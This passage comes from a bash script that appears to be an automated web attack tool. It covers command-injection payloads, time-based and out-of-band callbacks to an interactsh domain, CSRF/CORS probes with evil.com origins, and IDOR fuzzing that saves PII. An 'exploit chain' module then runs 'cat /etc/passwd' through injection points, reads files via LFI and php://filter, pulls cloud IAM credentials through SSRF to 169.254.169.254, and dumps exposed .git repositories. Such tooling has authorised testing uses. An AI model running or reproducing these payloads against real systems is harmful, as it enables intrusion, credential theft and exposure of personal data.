        local base; base=$(_curl -o /dev/null -w "%{time_total}" "$url" 2>/dev/null || echo "0.5")
        local base_ms; base_ms=$(awk -v t="$base" 'BEGIN { printf "%d", t*1000 }' 2>/dev/null || echo 500)

        local -a ECHO_PAYLOADS=(
            ";echo ${rand_id}" "&&echo ${rand_id}" "|echo ${rand_id}"
            "`echo ${rand_id}`" "$(echo ${rand_id})" ";echo%20${rand_id}"
            "&echo ${rand_id}" "||echo ${rand_id}" "%0aecho ${rand_id}"
            "';echo ${rand_id};'" "\"|echo ${rand_id}\""
            "| id" "; id" "`id`" "$(id)"
        )
        for payload in "${ECHO_PAYLOADS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local body; body=$(_curl --max-time 8 "$furl" 2>/dev/null | head -c 3000 || true)
            if echo "$body" | grep -q "$rand_id"; then
                uniq_add "$O/cmdi_confirmed.txt" "CMDi_CONFIRMED [echo] (${payload}): $furl"
                log_hit "CMDi (echo): $furl :: $payload"
                echo "### $furl [payload: $payload]" >> "$O/rce_output.txt"
                echo "$body" | grep -E "uid=|${rand_id}" | head -5 >> "$O/rce_output.txt"
            elif echo "$body" | grep -qE "uid=[0-9]+\(|gid=[0-9]+\(|groups?="; then
                uniq_add "$O/cmdi_confirmed.txt" "CMDi_CONFIRMED [id] (${payload}): $furl"
                log_hit "CMDi (id output): $furl :: $payload"
                echo "### $furl [payload: $payload]" >> "$O/rce_output.txt"
                echo "$body" | grep -E "uid=" | head -3 >> "$O/rce_output.txt"
            fi
        done

        local -a SLEEP_PAYLOADS=(
            ";sleep 5" "&sleep 5" "|sleep 5" "`sleep 5`" "$(sleep 5)"
            ";ping -c 5 127.0.0.1" "|ping -n 5 127.0.0.1"
            "||sleep 5 #" "&ping -i 5 127.0.0.1"
        )
        for payload in "${SLEEP_PAYLOADS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local t0; t0=$(date +%s%N)
            _curl --connect-timeout 4 --max-time 15 "$furl" >/dev/null 2>&1 || true
            local t1; t1=$(date +%s%N)
            local elapsed=$(( (t1 - t0) / 1000000 ))
            if [[ "$elapsed" -ge 4000 ]] && [[ "$elapsed" -gt $(( base_ms + 3000 )) ]]; then
                uniq_add "$O/cmdi_confirmed.txt" "CMDi_CONFIRMED [time] [${elapsed}ms] (${payload}): $furl"
                log_hit "CMDi (time-based ${elapsed}ms): $furl :: $payload"
            fi
        done

        if [[ -n "${INTERACTSH_DOMAIN:-}" ]]; then
            local rand; rand=$(head -c 6 /dev/urandom | xxd -p)
            local oob="nslookup ${rand}.${INTERACTSH_DOMAIN}"
            local oob_url; oob_url=$(echo "$url" | qsreplace "$oob" 2>/dev/null || true)
            _curl --max-time 6 "$oob_url" >/dev/null 2>&1 || true
            oob="curl http://${rand}.${INTERACTSH_DOMAIN}/"
            oob_url=$(echo "$url" | qsreplace "$oob" 2>/dev/null || true)
            _curl --max-time 6 "$oob_url" >/dev/null 2>&1 || true
            uniq_add "$O/oob_payloads_sent.txt" "OOB_CMDi [${rand}.${INTERACTSH_DOMAIN}]: $url"
        fi
    done < /tmp/cmdi_in_$$.txt
    rm -f /tmp/cmdi_in_$$.txt

    sort -u -o "$O/cmdi_confirmed.txt" "$O/cmdi_confirmed.txt" 2>/dev/null || true
    if [[ -s "$O/cmdi_confirmed.txt" ]]; then
        log_hit "CMDi CONFIRMED: $(cnt "$O/cmdi_confirmed.txt") — outputs in $O/rce_output.txt"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
            local payload; payload=$(echo "$line" | grep -oP '(?<=\().*(?=\): )' || true)
            [[ -z "$target" || -z "$payload" ]] && continue
            local out; out=$(_curl --max-time 10 "$(echo "$target" | qsreplace "${payload}id;whoami;uname -a" 2>/dev/null || true)" 2>/dev/null | head -c 1500 || true)
            [[ -n "$out" ]] && { echo "### RECON $target" >> "$O/host_recon.txt"; echo "$out" >> "$O/host_recon.txt"; }
        done < "$O/cmdi_confirmed.txt"
    fi
    log_ok "CMDi confirmed: $(cnt "$O/cmdi_confirmed.txt")"
}

# ── MODULE 14 — CSRF ───────────────────────────────────────────────────
mod_csrf() {
    progress "MODULE 14 — CSRF"
    log_section "MODULE 14 — CSRF DETECTION"
    local O="$WORKSPACE/vulns/csrf"
    mkdir -p "$O" 2>/dev/null || true
    local FORMS_IN="$WORKSPACE/urls/urls_dynamic.txt"
    [[ ! -s "$FORMS_IN" ]] && FORMS_IN="$WORKSPACE/urls/urls_with_params.txt"

    log_info "CSRF: scanning forms for missing tokens + weak Origin checks"
    while IFS= read -r url; do
        local html; html=$(_curl --max-time 10 "$url" 2>/dev/null || true)
        local has_form; has_form=$(echo "$html" | grep -ciE "<form" || true)
        if [[ "$has_form" -gt 0 ]]; then
            local has_token; has_token=$(echo "$html" | grep -ciE 'name=["'"'"'](csrf[^"'"'"']*|_token|authenticity_token|__RequestVerificationToken|xsrf[^"'"'"']*|token)' || true)
            if [[ "$has_token" -eq 0 ]]; then
                uniq_add "$O/csrf_no_token.txt" "CSRF_NO_TOKEN: $url"
            fi
            echo "$html" | grep -oE '<form[^>]*>' | while IFS= read -r form; do
                if echo "$form" | grep -qiE 'method="(post|put|delete|patch)"'; then
                    uniq_add "$O/csrf_forms.txt" "CSRF_FORM: $url"
                fi
            done
        fi
        local cookies; cookies=$(_curl -I "$url" 2>/dev/null | grep -i "^set-cookie" | head -5 || true)
        if [[ -n "$cookies" ]]; then
            while IFS= read -r ck; do
                if ! echo "$ck" | grep -qiE "samesite=(strict|lax)"; then
                    uniq_add "$O/csrf_cookies.txt" "COOKIE_NO_SAMESITE: $url"
                fi
            done <<< "$cookies"
        fi
        if echo "$url" | grep -qiE "(login|logout|password|email|profile|settings|delete|update|transfer|pay|admin|account)"; then
            local r200 r400
            r200=$(_curl -X POST -H "Origin: https://${DOMAIN}" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo 000)
            r400=$(_curl -X POST -H "Origin: https://evil.com"  -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo 000)
            if [[ "$r400" != "403" && "$r400" != "400" && "$r400" != "406" ]] && [[ "$r200" =~ ^(200|201|204|302)$ ]]; then
                uniq_add "$O/csrf_origin_weak.txt" "CSRF_ORIGIN_WEAK [same:${r200}/evil:${r400}]: $url"
            fi
        fi
    done < <(head -120 "$FORMS_IN" 2>/dev/null)

    sort -u -o "$O/csrf_no_token.txt" "$O/csrf_no_token.txt" 2>/dev/null || true
    sort -u -o "$O/csrf_origin_weak.txt" "$O/csrf_origin_weak.txt" 2>/dev/null || true
    [[ -s "$O/csrf_no_token.txt" ]]    && log_hit "CSRF missing tokens: $(cnt "$O/csrf_no_token.txt")"
    [[ -s "$O/csrf_origin_weak.txt" ]] && log_hit "CSRF weak Origin checks: $(cnt "$O/csrf_origin_weak.txt")"
    log_ok "CSRF scan complete"
}

# ── MODULE 15 — CORS ───────────────────────────────────────────────────
mod_cors() {
    progress "MODULE 15 — CORS"
    log_section "MODULE 15 — CORS MISCONFIGURATION"
    local O="$WORKSPACE/vulns/cors"
    mkdir -p "$O" 2>/dev/null || true
    local CORS_IN="$WORKSPACE/urls/urls_dynamic.txt"
    [[ ! -s "$CORS_IN" ]] && CORS_IN="$WORKSPACE/subdomains/live_urls.txt"

    log_info "CORS: testing with evil origins"
    local evil="https://evil.com"
    local evil_sub="https://${DOMAIN}.evil.com"
    local evil_suffix="https://evil${DOMAIN}"

    while IFS= read -r url; do
        for origin in "$evil" "$evil_sub" "$evil_suffix" "null"; do
            local headers; headers=$(_curl -H "Origin: $origin" -I "$url" 2>/dev/null || true)
            local acao; acao=$(echo "$headers" | grep -i "^access-control-allow-origin" | tr -d '\r' | head -1 || true)
            local acac; acac=$(echo "$headers" | grep -i "^access-control-allow-credentials" | tr -d '\r' | head -1 || true)
            if [[ -n "$acao" ]]; then
                local reflected="no"
                echo "$acao" | grep -qi "$origin" && reflected="yes"
                if [[ "$reflected" == "yes" ]] || echo "$acao" | grep -qi "null"; then
                    if echo "$acac" | grep -qi "true"; then
                        uniq_add "$O/cors_confirmed.txt" "CORS_CRED [${origin}] [${acao}]: $url"
                        log_hit "CORS CREDENTIALED [${origin}]: $url"
                    else
                        uniq_add "$O/cors_reflect.txt" "CORS_REFLECT [${origin}]: $url"
                        log_warn "CORS reflected (no creds): $url"
                    fi
                fi
            fi
        done
    done < <(head -150 "$CORS_IN" 2>/dev/null)

    sort -u -o "$O/cors_confirmed.txt" "$O/cors_confirmed.txt" 2>/dev/null || true
    sort -u -o "$O/cors_reflect.txt"   "$O/cors_reflect.txt"   2>/dev/null || true
    [[ -s "$O/cors_confirmed.txt" ]] && log_hit "CORS confirmed: $(cnt "$O/cors_confirmed.txt")"
    log_ok "CORS scan complete"
}

# ── MODULE 16 — IDOR ───────────────────────────────────────────────────
mod_idor() {
    progress "MODULE 16 — IDOR"
    log_section "MODULE 16 — IDOR / INSECURE DIRECT OBJECT REFERENCE"
    local O="$WORKSPACE/vulns/idor"
    mkdir -p "$O" 2>/dev/null || true
    local IDOR_IN="$WORKSPACE/urls/urls_with_params.txt"
    [[ ! -s "$IDOR_IN" ]] && IDOR_IN="$WORKSPACE/endpoints/all_endpoints.txt"
    [[ ! -s "$IDOR_IN" ]] && { log_warn "No URLs for IDOR"; return; }

    log_info "IDOR: extracting numeric IDs from URLs/endpoints..."
    local -A seen_ids
    grep -hoE '(id|ID|user|uid|account|acc|order|invoice|ticket|file|doc|profile|member|client|customer|product|item|post|comment|msg|message|room|chat|conversation|payment|transaction|subscription|org|team|project|repo|issue|pr|review)(=|/)[0-9]{1,12}' \
        "$IDOR_IN" "$WORKSPACE/js/"*.txt "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null \
        | sort -u > /tmp/idor_parsed_$$.txt || true

    grep -oE 'https?://[^ ]*[?&](id|uid|user|account|acc|order|invoice|file|doc|profile|member|client|customer|product|item|post|comment|msg|message|payment|transaction|org|team|project|repo|issue|pr)=[0-9]+' \
        "$IDOR_IN" 2>/dev/null | sort -u > "$O/idor_param_urls.txt" || true
    grep -oE 'https?://[^ ]*(/users?|/accounts?|/orders?|/invoices?|/files?|/documents?|/profiles?|/members?|/clients?|/customers?|/products?|/posts?|/messages?|/payments?|/transactions?|/orgs?|/teams?|/projects?|/repos?|/issues?|/pulls?|/reviews?)/[0-9]{1,12}' \
        "$IDOR_IN" 2>/dev/null | sort -u > "$O/idor_path_urls.txt" || true

    local n_param; n_param=$(wc -l < "$O/idor_param_urls.txt" 2>/dev/null || echo 0)
    local n_path;  n_path=$(wc -l < "$O/idor_path_urls.txt" 2>/dev/null || echo 0)
    log_info "IDOR targets: $n_param param-style + $n_path path-style"

    while IFS= read -r url; do
        local orig_id; orig_id=$(echo "$url" | grep -oE '[?&](id|uid|user|account|acc|order|invoice|file|doc|profile|member|client|customer|product|item|post|comment|msg|message|payment|transaction|org|team|project|repo|issue|pr)=[0-9]+' | head -1)
        local pname; pname=$(echo "$orig_id" | grep -oE '^[?&][a-zA-Z_]+' | tr -d '?&')
        local pval;  pval=$(echo "$orig_id" | grep -oE '[0-9]+$')
        [[ -z "$pname" || -z "$pval" ]] && continue
        [[ -n "${seen_ids[${pname}:${pval}]:-}" ]] && continue
        seen_ids["${pname}:${pval}"]=1

        local base; base=$(_curl -o /dev/null -w "%{http_code} %{size_download}" "$url" 2>/dev/null || echo "000 0")
        local b_code; b_code=$(echo "$base" | cut -d' ' -f1)
        local b_size; b_size=$(echo "$base" | cut -d' ' -f2)
        local b_body; b_body=$(_curl "$url" 2>/dev/null | head -c 800 || true)
        local b_hash; b_hash=$(echo "$b_body" | md5sum | cut -d' ' -f1)
        local b_haspii; b_haspii=$(echo "$b_body" | grep -ciE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing)"' || true)

        for delta in "-2" "-1" "+1" "+2" "+1000" "+999999"; do
            local new_id=$(( pval + delta ))
            [[ "$new_id" -lt 1 ]] && continue
            local fuzz; fuzz=$(echo "$url" | sed "s/\([?&]${pname}=\)[0-9]*/\1${new_id}/")
            local resp; resp=$(_curl -o /dev/null -w "%{http_code} %{size_download}" "$fuzz" 2>/dev/null || echo "000 0")
            local r_code; r_code=$(echo "$resp" | cut -d' ' -f1)
            local r_size; r_size=$(echo "$resp" | cut -d' ' -f2)
            local r_body; r_body=$(_curl "$fuzz" 2>/dev/null | head -c 800 || true)
            local r_hash; r_hash=$(echo "$r_body" | md5sum | cut -d' ' -f1)
            local r_haspii; r_haspii=$(echo "$r_body" | grep -ciE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing)"' || true)

            if [[ "$r_code" =~ ^(200|201)$ ]] && [[ "$r_hash" != "$b_hash" ]] && \
               { [[ "$r_haspii" -gt 0 ]] || [[ "$r_size" -gt "$b_size" ]]; }; then
                uniq_add "$O/idor_seq_diff.txt" "IDOR [${pname}=${pval}→${new_id}] [${b_code}/${b_size}b → ${r_code}/${r_size}b] [PII:${r_haspii}]: $fuzz"
                log_hit "IDOR candidate: $fuzz (${b_size}b → ${r_size}b)"
                echo "### $fuzz" >> "$O/idor_dump.txt"
                echo "$r_body" >> "$O/idor_dump.txt"
            fi
        done
    done < "$O/idor_param_urls.txt"

    while IFS= read -r url; do
        local orig_id; orig_id=$(echo "$url" | grep -oE '/[0-9]{1,12}$' | tr -d '/')
        [[ -z "$orig_id" ]] && continue
        local new_id=$(( orig_id + 1 ))
        local fuzz; fuzz=$(echo "$url" | sed "s|/[0-9]\{1,12\}$|/${new_id}|")
        local r_body; r_body=$(_curl "$fuzz" 2>/dev/null | head -c 800 || true)
        local r_code; r_code=$(_curl -o /dev/null -w "%{http_code}" "$fuzz" 2>/dev/null || echo 000)
        local r_haspii; r_haspii=$(echo "$r_body" | grep -ciE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing)"' || true)
        if [[ "$r_code" =~ ^(200|201)$ ]] && [[ "$r_haspii" -gt 0 ]] && \
           ! echo "$r_body" | grep -qiE "(not found|unauthorized|forbidden|permission)"; then
            uniq_add "$O/idor_seq_diff.txt" "IDOR_PATH [${orig_id}→${new_id}] [$r_code] [PII:${r_haspii}]: $fuzz"
            log_hit "IDOR path candidate: $fuzz"
            echo "### $fuzz" >> "$O/idor_dump.txt"
            echo "$r_body" >> "$O/idor_dump.txt"
        fi
    done < "$O/idor_path_urls.txt"

    rm -f /tmp/idor_parsed_$$.txt
    sort -u -o "$O/idor_seq_diff.txt" "$O/idor_seq_diff.txt" 2>/dev/null || true
    sort -u -o "$O/idor_dump.txt" "$O/idor_dump.txt" 2>/dev/null || true
    if [[ -s "$O/idor_seq_diff.txt" ]]; then
        log_hit "IDOR confirmed candidates: $(cnt "$O/idor_seq_diff.txt")"
        cp "$O/idor_seq_diff.txt" "$O/idor_confirmed.txt" 2>/dev/null || true
    fi
    log_ok "IDOR scan complete"
}

# ── MODULE 17 — OAUTH ──────────────────────────────────────────────────
mod_oauth() {
    progress "MODULE 17 — OAuth / SSO"
    log_section "MODULE 17 — OAUTH / SSO MISCONFIGURATION"
    local O="$WORKSPACE/vulns/oauth"
    mkdir -p "$O" 2>/dev/null || true

    local oauth_src="$WORKSPACE/js/all_js_endpoints.txt $WORKSPACE/endpoints/all_endpoints.txt $WORKSPACE/js/oauth.txt"
    grep -hoE 'https?://[^"'"'"' ]*(/oauth/[a-zA-Z/]*|/authorize[^"'"'"' ]*|/token[^"'"'"' ]*|/connect/[a-zA-Z/]*|/oidc/[a-zA-Z/]*|/sso/[a-zA-Z/]*|/saml/[a-zA-Z/]*)' \
        $oauth_src 2>/dev/null | sort -u > "$O/oauth_endpoints.txt" || true

    local OAUTH_CAND="$O/oauth_endpoints.txt"
    if [[ ! -s "$OAUTH_CAND" ]]; then
        log_info "No OAuth endpoints in JS/endpoints — probing known paths..."
        for p in /oauth/authorize /oauth/token /authorize /token /connect/authorize \
                 /api/oauth/authorize /api/oauth/token /oidc/authorize /oidc/token /sso/login /login/oauth/authorize; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" "https://$DOMAIN$p" 2>/dev/null || echo 000)
            [[ "$c" != "000" && "$c" != "404" ]] && uniq_add "$OAUTH_CAND" "https://$DOMAIN$p [$c]"
        done
        sort -u -o "$OAUTH_CAND" "$OAUTH_CAND" 2>/dev/null || true
    fi
    log_info "OAuth endpoints: $(cnt "$OAUTH_CAND")"

    local evil_redirect="${INTERACTSH_DOMAIN:-evil.com}"
    while IFS= read -r line; do
        local url; url=$(echo "$line" | grep -oP 'https?://\S+' | head -1)
        [[ -z "$url" ]] && continue

        if echo "$url" | grep -qE "(authorize|connect|oidc|sso)"; then
            for ru in \
                "https://${evil_redirect}/" \
                "https://${evil_redirect}/$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)" \
                "https://$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1).${evil_redirect}/" \
                "https://$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)@${evil_redirect}/" \
                "javascript:alert(1)" \
                "//${evil_redirect}/"; do
                local test_url; test_url=$(echo "$url" | sed 's|\(redirect_uri=\|redirect_uri%3d\|return_uri=\|callback=\|next=\|continue=\|returnTo=\|redirect=\).*|\1'"$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$ru" 2>/dev/null || echo "$ru")"'|')
                local loc; loc=$(_curl -o /dev/null -w "%{redirect_url}" --max-time 8 "$test_url" 2>/dev/null || true)
                if echo "$loc" | grep -qiE "${evil_redirect}|javascript:"; then
                    uniq_add "$O/oauth_redirect_uri.txt" "OAUTH_REDIRECT_URI_OPEN [→ ${loc}]: $test_url"
                    log_hit "OAuth redirect_uri open redirect: $test_url → $loc"
                fi
            done
        fi
        if echo "$url" | grep -qE "(authorize|connect|oidc|sso)"; then
            if ! echo "$url" | grep -qiE "state="; then
                uniq_add "$O/oauth_no_state.txt" "OAUTH_NO_STATE (login-CSRF risk): $url"
            fi
        fi
        if echo "$url" | grep -qE "(response_type=token|response_type%3dtoken)"; then
            uniq_add "$O/oauth_implicit.txt" "OAUTH_IMPLICIT_FLOW: $url"
        fi
    done < "$OAUTH_CAND"

    grep -hoE '"(client_secret|clientSecret|client_secret_id|secret_key|api_secret|consumer_secret)"\s*[:=]\s*"[^"]{8,}"' \
        "$WORKSPACE/js/"*.txt 2>/dev/null | sort -u > "$O/oauth_secrets_in_js.txt" || true
    sort -u -o "$O/oauth_secrets_in_js.txt" "$O/oauth_secrets_in_js.txt" 2>/dev/null || true
    [[ -s "$O/oauth_secrets_in_js.txt" ]] && log_hit "OAuth secrets leaked in JS: $(cnt "$O/oauth_secrets_in_js.txt")"
    [[ -s "$O/oauth_redirect_uri.txt" ]] && log_hit "OAuth redirect_uri open: $(cnt "$O/oauth_redirect_uri.txt")"
    log_ok "OAuth scan complete"
}
# ── MODULE 18 — TECH STACK ─────────────────────────────────────────────
mod_tech() {
    progress "MODULE 18 — Technology Stack"
    log_section "MODULE 18 — TECH STACK DETECTION"
    local O="$WORKSPACE/tech"
    mkdir -p "$O" 2>/dev/null || true
    local IN="$WORKSPACE/subdomains/live_urls.txt"
    [[ ! -s "$IN" ]] && { log_warn "No live URLs for tech detection"; return; }
    local n=0 total; total=$(wc -l < "$IN")

    while IFS= read -r url; do
        n=$((n+1)); progress "TECH ($n/$total)"
        local hdrs; hdrs=$(_curl -I --max-time 12 "$url" 2>/dev/null || true)
        local body; body=$(_curl --max-time 12 "$url" 2>/dev/null | head -c 40000 || true)
        {
            echo "### $url"
            echo "$hdrs" | grep -iE "^(server|x-powered-by|x-aspnet-version|x-generator|via|x-backend|set-cookie|cf-ray|nel|report-to|x-amz-|x-azure|x-vercel|x-github|x-nextjs|x-drupal|x-varnish|x-served-by|x-debug-backend)" | tr -d '\r' | sort -u
            echo "$hdrs" | grep -iE "^set-cookie" | grep -oiE "^set-cookie: [a-zA-Z0-9_]+" | tr -d '\r' | sort -u
            echo "$body" | grep -oiE '<meta[^>]+(generator|framework)[^>]*>' | head -3
            echo "$body" | grep -oiE '(wp-content|wp-includes|wordpress)' | head -1  | sed 's/^/WORDPRESS: /'
            echo "$body" | grep -oiE '(<title>[^<]*</title>|drupal|joomla|laravel|symfony|django|rails|express|next\.js|nuxt|gatsby|react|vue|angular)' | sort -u | head -8
            echo "$body" | grep -oiE 'bootstrap[^"'"'"' ]*\.css|tailwind|foundation\.css' | sort -u | head -3
        } >> "$O/headers.txt"

        local server; server=$(echo "$hdrs" | grep -i "^server:" | head -1 | tr -d '\r' | cut -d' ' -f2-)
        local xp;     xp=$(echo "$hdrs" | grep -i "^x-powered-by:" | head -1 | tr -d '\r' | cut -d' ' -f2-)
        [[ -n "$server" ]] && uniq_add "$O/servers.txt" "$server"
        [[ -n "$xp" ]] && uniq_add "$O/powered_by.txt" "$xp"

        if echo "$hdrs" "$body" | grep -qi "wordpress"; then
            uniq_add "$O/cms.txt" "WORDPRESS: $url"
            local wpver; wpver=$(echo "$body" | grep -oE 'generator" content="WordPress [0-9.]+' | grep -oE '[0-9.]+$')
            [[ -n "$wpver" ]] && uniq_add "$O/versions.txt" "WordPress $wpver @ $url"
        fi
        if echo "$hdrs" "$body" | grep -qiE "drupal"; then
            uniq_add "$O/cms.txt" "DRUPAL: $url"
            local dver; dver=$(echo "$body" | grep -oE 'Drupal [0-9.]+' | head -1)
            [[ -n "$dver" ]] && uniq_add "$O/versions.txt" "$dver @ $url"
        fi
        if echo "$hdrs" "$body" | grep -qiE "joomla|com_content"; then
            uniq_add "$O/cms.txt" "JOOMLA: $url"
            local jver; jver=$(echo "$body" | grep -oE 'Joomla! [0-9.]+' | head -1)
            [[ -n "$jver" ]] && uniq_add "$O/versions.txt" "$jver @ $url"
        fi
        if echo "$body" | grep -qiE "laravel|csrf-token|XSRF-TOKEN|/api/user\b"; then
            uniq_add "$O/frameworks.txt" "LARAVEL: $url"
            echo "$body" | grep -oE 'Laravel v?[0-9.]+' | head -1 >> "$O/versions.txt"
        fi
        if echo "$hdrs" "$body" | grep -qiE "django|csrftoken"; then
            uniq_add "$O/frameworks.txt" "DJANGO: $url"
            echo "$hdrs" | grep -oiE 'csrftoken' | head -1 >> "$O/versions.txt"
        fi
        if echo "$body" | grep -qiE "__NEXT_DATA__|next\.js|_next/static"; then
            uniq_add "$O/frameworks.txt" "NEXT.JS: $url"
            echo "$body" | grep -oE 'next\.js[^<]{0,40}|__NEXT_DATA__' | head -1 >> "$O/versions.txt"
        fi
        if echo "$hdrs" | grep -qi "x-amz-cf-id\|cloudfront"; then
            uniq_add "$O/cdn.txt" "CLOUDFRONT: $url"
        elif echo "$hdrs" | grep -qiE "cf-ray|cloudflare"; then
            uniq_add "$O/cdn.txt" "CLOUDFLARE: $url"
        elif echo "$hdrs" | grep -qi "x-vercel"; then
            uniq_add "$O/cdn.txt" "VERCEL: $url"
        elif echo "$hdrs" | grep -qi "x-github-request"; then
            uniq_add "$O/cdn.txt" "GITHUB_PAGES: $url"
        fi
        local ip; ip=$(dig +short "$(echo "$url" | sed 's|https\?://||;s|/.*||')" A 2>/dev/null | grep -E '^[0-9.]+$' | head -1)
        [[ -n "$ip" ]] && uniq_add "$O/ips.txt" "$ip"
    done < "$IN"

    for f in servers.txt powered_by.txt cms.txt frameworks.txt cdn.txt versions.txt ips.txt; do
        sort -u -o "$O/$f" "$O/$f" 2>/dev/null || true
    done
    log_info "Servers: $(cat "$O/servers.txt" 2>/dev/null | tr '\n' ' ')"
    log_info "CDN/WAF: $(cat "$O/cdn.txt" 2>/dev/null | tr '\n' ' ')"
    [[ -s "$O/cms.txt" ]] && log_hit "CMS: $(cat "$O/cms.txt" | tr '\n' ' ')"
    [[ -s "$O/frameworks.txt" ]] && log_hit "Frameworks: $(cat "$O/frameworks.txt" | tr '\n' ' ')"
    log_ok "Tech stack: $(cnt "$O/servers.txt") servers, $(cnt "$O/cms.txt") CMS, $(cnt "$O/frameworks.txt") frameworks"
}

# ── MODULE 21 — EXPLOIT CHAIN (self-exploitation) ──────────────────────
mod_exploit_chain() {
    progress "MODULE 21 — Exploit Chain"
    log_section "MODULE 21 — AUTOMATED EXPLOIT CHAIN (self-exploitation)"
    local O="$WORKSPACE/exploit"
    mkdir -p "$O" 2>/dev/null || true
    local V="$WORKSPACE/vulns"
    local did_anything=false

    # 21.1 CMDi → host recon
    if [[ -s "$V/cmdi/cmdi_confirmed.txt" ]]; then
        log_hit "CHAIN 1: CMDi confirmed → dropping /etc/passwd + hostname"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
            local payload; payload=$(echo "$line" | grep -oP '(?<=\().*(?=\): )' || true)
            [[ -z "$target" ]] && continue
            local cmd; cmd="cat /etc/passwd;id;hostname;uname -a"
            [[ -n "$payload" ]] && cmd="${payload}${cmd}"
            local out; out=$(_curl --max-time 12 "$(echo "$target" | qsreplace "$cmd" 2>/dev/null || true)" 2>/dev/null | head -c 3000 || true)
            if echo "$out" | grep -qE "uid=|root:x:0:0"; then
                uniq_add "$O/cmdi_rce.txt" "CMDi_RCE: $target [${payload}]"
                echo "### $target [cmd: $cmd]" >> "$O/host_recon.txt"
                echo "$out" >> "$O/host_recon.txt"
                did_anything=true
            fi
        done < "$V/cmdi/cmdi_confirmed.txt"
    fi

    # 21.2 LFI → file read + possible log poison
    if [[ -s "$V/lfi/lfi_confirmed.txt" ]]; then
        log_hit "CHAIN 2: LFI confirmed → reading /etc/passwd + webroot files"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
            [[ -z "$target" ]] && continue
            for pf in "../../../../../../etc/passwd" "php://filter/convert.base64-encode/resource=/etc/passwd" "php://filter/convert.base64-encode/resource=index.php"; do
                local u; u=$(echo "$target" | qsreplace "$pf" 2>/dev/null || true)
                local b; b=$(_curl --max-time 10 "$u" 2>/dev/null | head -c 3000 || true)
                if echo "$b" | grep -q "root:x:0:0"; then
                    uniq_add "$O/lfi_reads.txt" "LFI_READ: $u"
                    echo "### $u" >> "$O/lfi_reads_dump.txt"; echo "$b" >> "$O/lfi_reads_dump.txt"
                    did_anything=true
                elif echo "$b" | grep -qE '^[A-Za-z0-9+/]{60,}={0,2}$'; then
                    local d; d=$(echo "$b" | tr -d '\n' | base64 -d 2>/dev/null || true)
                    if echo "$d" | grep -qE "root:|<\?php|application/"; then
                        uniq_add "$O/lfi_reads.txt" "LFI_READ_B64: $u"
                        echo "### $u" >> "$O/lfi_reads_dump.txt"; echo "$d" >> "$O/lfi_reads_dump.txt"
                        did_anything=true
                    fi
                fi
            done
        done < "$V/lfi/lfi_confirmed.txt"
    fi

    # 21.3 SSRF → cloud metadata + internal services
    if [[ -s "$V/ssrf/ssrf_confirmed.txt" ]]; then
        log_hit "CHAIN 3: SSRF confirmed → cloud metadata + internal ports"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
            [[ -z "$target" ]] && continue
            local q; q=$(echo "$target" | grep -q '?' && echo yes || echo no)
            for meta in \
                "http://169.254.169.254/latest/meta-data/" \
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
                "http://169.254.169.254/latest/user-data/" \
                "http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
                "http://100.100.100.200/latest/meta-data/" \
                "file:///etc/passwd" \
                "http://127.0.0.1:80/" \
                "http://127.0.0.1:8080/" \
                "http://127.0.0.1:8000/" \
                "http://localhost:22/"; do
                local u
                if [[ "$q" == "yes" ]]; then u="${target}&url=${meta}"; else u="${target}?url=${meta}"; fi
                local b; b=$(_curl --max-time 10 "$u" 2>/dev/null | head -c 2500 || true)
                if echo "$b" | grep -qiE "accesskeyid|secretaccesskey|token|account_id|iam/security|ami-id|hostname|instance-id|public-keys|root:x:0:0|ssh-rsa|OPENSSH"; then
                    uniq_add "$O/ssrf_metadata.txt" "SSRF_METADATA [${meta}]: $u"
                    echo "### $u" >> "$O/ssrf_metadata_dump.txt"; echo "$b" >> "$O/ssrf_metadata_dump.txt"
                    log_hit "SSRF metadata hit: $meta"
                    did_anything=true
                fi
            done
        done < "$V/ssrf/ssrf_confirmed.txt"
    fi

    # 21.4 Takeover (CNAME verify)
    if [[ -s "$WORKSPACE/subdomains/takeover_candidates.txt" ]]; then
        log_hit "CHAIN 4: takeover candidates → CNAME + NXDOMAIN verification"
        while IFS= read -r sub; do
            local cname; cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1)
            [[ -z "$cname" ]] && continue
            local rec; rec=$(dig +short "$cname" A 2>/dev/null | head -1)
            if [[ -z "$rec" ]] || dig +short "$cname" CNAME 2>/dev/null | grep -q . ; then
                if [[ -z "$rec" ]]; then
                    uniq_add "$O/takeover.txt" "TAKEOVER [dangling CNAME → ${cname} (NXDOMAIN)]: $sub"
                    log_hit "TAKEOVER: $sub → $cname (dangling)"
                    did_anything=true
                fi
            fi
        done < "$WORKSPACE/subdomains/takeover_candidates.txt"
    fi

    # 21.5 .git exposure → git-dumper
    if [[ -s "$V/tech/.git_exposed.txt" ]]; then
        log_hit "CHAIN 5: .git exposure → dumping repository"
        while IFS= read -r line; do
            local base; base=$(echo "$line" | grep -oP 'https?://\S+' | head -1 | sed 's|/\.git.*||')
            [[ -z "$base" ]] && continue
            local outdir; outdir="$O/git_dump/$(safe_name "$base")"
            mkdir -p "$outdir" 2>/dev/null || true
            if command -v git-dumper >/dev/null 2>&1; then
                git-dumper "$base/.git/" "$outdir" >/dev/null 2>&1 && { uniq_add "$O/git_dumped.txt" "$base/.git"; did_anything=true; }
            else
                local idx; idx=$(_curl --max-time 8 "$base/.git/index" 2>/dev/null | head -c 4 || true)
